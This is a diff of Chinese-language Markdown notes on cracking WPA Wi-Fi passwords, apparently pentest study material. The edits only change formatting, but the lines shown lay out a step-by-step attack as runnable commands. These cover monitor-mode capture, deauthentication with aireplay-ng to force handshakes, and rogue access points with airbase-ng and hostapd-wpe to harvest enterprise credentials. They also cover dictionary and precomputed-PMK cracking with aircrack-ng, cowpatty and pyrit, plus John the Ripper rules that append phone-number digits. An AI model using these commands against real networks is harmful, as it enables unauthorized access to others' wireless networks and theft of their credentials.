@@ -5,9 +5,9 @@
 > 按类型分为WPA个人(PSK), WPA企业(EAP)
 
 
-+ 消耗计算资源
-+ 消耗时间
-+ 成败关键看字典
+- 消耗计算资源
+- 消耗时间
+- 成败关键看字典
   - 网上共享的字典
   - 泄露秘密
   - 地区电话号码段
@@ -25,7 +25,7 @@
 
 1. 准备
 
-  ```
+  ```bash
   service network-manager stop
 
   airmon-ng check kill
@@ -33,12 +33,12 @@
 
 2. 启动monitor
 
-  ```
+  ```bash
   airmon-ng start wlan0
   ```
 3. 开始抓包并保存
 
-  ```
+  ```bash
   airodump-ng wlan0mon
 
   airodump-ng --bssid <AP BSSID> -c 11 -w wpa wlan0mon
@@ -46,13 +46,13 @@
 
 4. Deauthentication攻击获取4步握手信息
 
-  ```
+  ```bash
   aireplay-ng -0 2 -a <AP BSSID> -c <STATION MAC> wlan0mon
   ```
 
 5. **密码破解**
 
-  ```
+  ```bash
   aircrack-ng -w /usr/share/john/password.lst wpa-01.cap
   ```
   
@@ -66,7 +66,7 @@
 3. 根据probe信息伪造相同ESSID的AP
 
 
-```
+```bash
 airbase-ng --essid ESSID -c 11 wlan0mon # 开放AP
 
 airbase-ng --essid ESSID -c 11 wlan0mon -0 # -0,同时设置所有种类加密类型AP
@@ -82,7 +82,7 @@ airbase-ng --essid ESSID -c 11 wlan0mon -0 # -0,同时设置所有种类加密�
 相关项目: 
 http://w1.fi/releases/
 https://github.com/OpenSecurityResearch/hostapd-wpe
-```
+```text
 Basic usage is:
 
     hostapd-wpe hostapd-wpe.conf 
@@ -149,7 +149,7 @@ Running:
 ```
 
 在启动`hostapd hostapd-wpe.conf`之前, 可以先修改hostapd-wpe.conf, 
-```
+```text
 interface=wlan0
 
 dirver=nl80211
@@ -164,19 +164,19 @@ channel=11
 ### 破解
 **注意: **
 > 先执行
-```
+```bash
 service network-manager stop
 airmon-ng check kill 
 ```
 再把网卡映射到kali中
 
-```
+```bash
 ./hostapd-wpe hostapd-wpe.conf 
 
 有人尝试连接时显示challenge 和 response
 ```
 
-```
+```bash
 asleap -C < challenge > -R <response> -W password.lst
 ```
 
@@ -184,13 +184,13 @@ asleap -C < challenge > -R <response> -W password.lst
 ### AIROLIB破解密码
 > 适用于经常破解特定ESSID名称的AP密码
 
-+ 设计用于存储ESSID和密码列表
-+ 计算生成不变的PMK（计算资源消耗型）
-+ PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）
-+ 通过完整性摘要值破解密码
-+ SQLlite3数据库存储数据
+- 设计用于存储ESSID和密码列表
+- 计算生成不变的PMK（计算资源消耗型）
+- PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）
+- 通过完整性摘要值破解密码
+- SQLlite3数据库存储数据
 
-```
+```bash
 echo ESSID > essid.txt 
 
 airolib-ng db --import essid essid.txt
@@ -208,11 +208,11 @@ aircrack-ng -r db wpa.cap   # 字典里添加了正确的密码了,但这个居�
 
 ### JTR破解密码
 > John the ripper,
-+ 快速的密码破解软件
-+ 支持基于规则扩展密码字典
-+ 实例: 很多人喜欢用手机号码做无线密码, 可以获取号段并利用JTR规则增加最后几位的数字
+- 快速的密码破解软件
+- 支持基于规则扩展密码字典
+- 实例: 很多人喜欢用手机号码做无线密码, 可以获取号段并利用JTR规则增加最后几位的数字
 
-```
+```bash
 vi /etc/john/john.conf
 在最后加上密码规则
 $[0-9]$[0-9]$[0-9]$[0-9]
@@ -226,21 +226,21 @@ john --wroldlist=pass.list --rules --stdout | aricrack-ng -e kifi -w - wap.cap
 
 或
 
-```
+```bash
 john --wordlist=num.txt --stdout --mask=?w[1-9][1-9][1-9][1-9] | aircrack-ng -e ESSID -w - wpa-01.cap # 末尾填四个数字之后利用生成密码破解
 ```
 
 ### COWPATTY破解密码
 > WPA密码通用破解工具
 
-+ 使用密码字典  
-```
+- 使用密码字典  
+```bash
 cowpatty -r wpa-01.cap -f password.lst -s ESSID
 ```
 
-+ 使用彩虹表(PMK)    
+- 使用彩虹表(PMK)    
 
-```
+```bash
 genpmk -f password.lst -d pmkhash -s ESSID
 
 cowpatty -r wpa-01.cap -d pmkhash -s ESSID
@@ -250,58 +250,58 @@ cowpatty -r wpa-01.cap -d pmkhash -s ESSID
 ### PYRIT破解密码
 > 与airolib、cowpatty相同，支持基于预计算的PMK提高破解速度
 
-+ 独有的优势
+- 独有的优势
   - 除CPU之外pyrit可以运行GPU的强大运算能力加速生成PMK
   - 本身支持抓包获取四步握手过程，无需用Airdum抓包
   - 也支持传统的读取airodump抓包获取四步握手的方式
-+ 只抓取WAP四次握手过程包
+- 只抓取WAP四次握手过程包
 
-```
+```bash
 pyrit -r wlan2mon -o wpapyrit.cap stripLive
 
 pyrit -r wpapyrit.cap analyze
 ```
 
-+ 从airodump抓包导入并筛选
+- 从airodump抓包导入并筛选
 
-```
+```bash
 pyrit -r wpa.cap -o wpapyrit.cap strip
 ```
 
 #### 使用密码字典破解
 
-```
+```bash
 pyrit -r pyrit.cap -i ./password.lst -b 24:da:9b:7b:81:36  attack_passthrough
 ```
 
 #### 数据库模式破解
-+ 默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库
-+ 查看默认数据库状态：
+- 默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库
+- 查看默认数据库状态：
 
-```
+```bash
 pyrit eval
 ```
-+ 导入密码字典
+- 导入密码字典
 
-```
+```bash
 pyrit -i password.lst import_passwords (自动剔除不合规的密码）
 ```
 
-+ 制定ESSID
+- 制定ESSID
 
-```
+```bash
 pyrit -e ESSID create_essid
 ```
 
-+ 计算PMK(**会自动调用GPU计算**)
+- 计算PMK(**会自动调用GPU计算**)
 
-```
+```bash
 pyrit batch  (发挥GPU计算能力）
 ```
 
-+ 破解密码
+- 破解密码
 
-```
+```bash
 pyrit -r wpapyrit.cap -b <AP MAC> attack_db
 或
 pyrit -r pyrit.cap -e <AP ESSID> attack_db
